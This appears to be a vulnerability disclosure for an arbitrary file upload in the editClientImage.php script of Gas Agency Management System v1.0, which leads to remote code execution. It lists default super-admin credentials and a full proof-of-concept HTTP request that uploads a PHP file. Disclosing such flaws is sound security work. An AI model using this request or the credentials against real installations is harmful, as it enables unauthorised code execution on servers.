# Gas Agency Management System v1.0 by mayuri_k has arbitrary code execution (RCE)

BUG_Author: 白万荣

vendors: https://www.sourcecodester.com/php/15586/gas-agency-management-system-project-php-free-download-source-code.html

The program is built using the xmapp-php8.1 version

Login account: mayuri.infospace@gmail.com/admin (Super Admin account)

Vulnerability url: ip/gasmark/php_action/editClientImage.php?id=1

Loophole location: arbitrary file upload exists in Gas Agency Management System's editClientImage.php file (RCE).

Request package for file upload：

```sql
POST /gasmark/php_action/editClientImage.php?id=1 HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.88/gasmark/editclient.php?id=1
Cookie: PHPSESSID=1848l0sacnthbvkk77stfdihkh
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------299472295912533
Content-Length: 439

-----------------------------299472295912533
Content-Disposition: form-data; name="old_image"

pexels-italo-melo-2379005.jpg
-----------------------------299472295912533
Content-Disposition: form-data; name="productImage"; filename="2.php"
Content-Type: image/jpeg

<?php phpinfo();>
-----------------------------299472295912533
Content-Disposition: form-data; name="btn"


-----------------------------299472295912533--
```

The files will be uploaded to this directory \gasmark\assets\myimages
![image](https://github.com/assets/54017627/b16051b7-d591-4250-83a8-58d83d153ee6)


We visited the directory of the file in the browser and found that the code had been executed
![image](https://github.com/assets/54017627/59d817be-dca5-44c1-ae95-ea173d7c4605)
